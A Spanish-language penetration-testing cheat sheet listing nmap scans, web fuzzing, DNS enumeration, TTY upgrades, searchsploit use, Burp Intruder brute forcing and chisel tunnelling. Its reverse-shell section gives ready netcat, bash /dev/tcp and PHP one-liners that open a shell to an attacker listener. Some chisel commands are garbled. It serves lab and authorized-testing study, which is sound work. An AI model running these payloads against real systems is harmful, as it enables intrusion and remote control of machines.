# Pentester Cheat Sheet CiberSecurity

### Host
```
ping -c 1 10.10.10.10
si TTL = 128 Windows / 64 Linux
```

### Reconocimiento
**Escaneo de puertos**
```
nmap 10.10.10.10 -p- --open -T5 -v -n -oG PuertosOpen (NORMAL)
nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.10 -oG PuertosOpen (FAST)
```

**Escaneo de puertos UDP**
```
 nmap -sC -sV -sU --top-ports 100 10.10.10.10 -OG PuertosOpenUDP
```

**Escaneo de servicios**
```
nmap -sC -sV -p80,443,445 10.10.10.10 -oN VersionServices
```


### Enumeración
**Wfuzz**
```
wfuzz -c -L -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://ip-site/FUZZ
```
```
wfuzz -c -L -t 200 --hc=404 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://ip-site/FUZZ.extension
```
```
100 = Continuar
200 = OK
201 = Creado
202 = Aceptado
204 = Sin contenido
301 = Permanentemente re dirigido o movido.
302 = Temporalmente re dirigido o movido.
400 = Solicitud incorrecta.
401 = Requiere autorización.
403 = Prohibido.
404 = No se encuentra.
500 = Error crítico en el servidor.
```
**Gobuster**
```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://ip-site
```

**Nmap Script**
```
nmap --script http-enum -p80 10.10.10.10 -oN EnumDirectory

```

**Wordpress**
```
wpscan --url http://10.10.10.10
```

**DNS**
```
dnsrecon -d google.com -n 10.10.10.10
```

**Lista Subdominios**
```
sublist3r -d target-host.com
```

### Reverse Shells
**Netcat**
```
nc -e /bin/sh 10.0.0.1 1234**
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

**Bash**

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

**PHP**

```
$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

**Example**
```
<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
```

### Tratamiento TTY 
**TTY**
```
.- script /dev/null -c bash
.- ctrl + z
.- stty raw -echo; fg
.- reset
.- xterm
.- export TERM=xterm
.- export SHELL=bash
.- stty -a <nueva ventana>
.- stty rows <rows> columns <columns>
```
### Servidores Web 
**Python3**
```
python3 -m http.server 8080
```
**Netcat**

```
nc -lvnp 8080
```

### Exploits DB
**Busqueda Exploit**
```
searchsploit apache
```

**Ver Exploit**

```
searchsploit -x NumberExploit
```

**Descargar Exploit**
```
searchsploit -m NumberExploit
```

### Analisis De Archivos
**Ver Tipo De Archivo**
```
file unknown.x
```

**Extraer Información**
```
strings file
```

**Buscar Información Oculta**
```
binwalk file.png
```

**Extraer Información Oculta**
```
binwalk -e file.png
```

### Encode / Decode
**Texto A Base64**
```
echo -n "text" | base64
```
**Base64 A Texto**
```
echo -n "dGV4dA==" | base64 -d
```

### Brute Force
**File SHA-256-CBC**
```
bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 file_encoded -1
```

**BurpSuite**
```
.- Proxy/Options   -> Allow (Dont send items to proxy history or live tasks, if but of scope)
.- Target/Scope    -> Add (Site-Work)
.- Proxy/Intercept -> On intercept
.- Realizar Petición A Capturar
.- Ctrl + i (Send Intruder)
.- Clear S + Add S (S = Select)
.- head -n 10000 /usr/share/wordlists/rockyou.txt > passwords (Create Diccionary)
.- Payload Options Simple List/Load (Load dictionary)
.- Disallow Option Payload Encoding
.- Options/Refetch Response (Select expresion regular) 
.- Start Sttack
```


### Certificados SSL
**Inspeccionar Certificado**
```
openssl s_client -connect 10.10.10.10:443
```


### Utilidades
**Administrador De Tareas**
```
ps -faux
```

**Knock**
```
cat /etc/knockd.conf
knock 10.10.10.10 port:protocol
```

**Pspy**
```
git clone https://github.com/DominicBreuker/pspy.git
go build main.go
chmod +x pspy
./pspy
```

**Chisel**
```
chmod +x
```
```
./chisel server — reverse — port 20000
```
```
./chisel client 10.10.14.21:20000 R:21000:127.0.0.1:80
```
```
./chisel server --reverse-port 2000
```




**Tmux**
```
c  create window
w  list windows
n  next window
p  previous window
f  find window
,  name window
&  kill window
```
